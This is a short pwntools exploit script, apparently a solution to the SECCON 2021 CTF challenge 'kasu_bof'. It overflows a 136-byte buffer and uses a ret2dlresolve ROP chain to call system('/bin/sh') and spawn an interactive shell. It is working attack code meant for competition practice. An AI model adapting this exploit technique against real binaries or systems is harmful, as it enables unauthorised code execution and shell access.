#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./chall') # 136 EIP
p = process()
rop = ROP(elf)
# p = remote('hiyoko.quals.seccon.jp',9001)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A'*136)
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)
p.sendline(dlresolve.payload)

p.interactive()

# https://github.com/sajjadium/ctf-archives/raw/main/SECCON/2021/pwn/kasu_bof/chall
# challenge download link ^
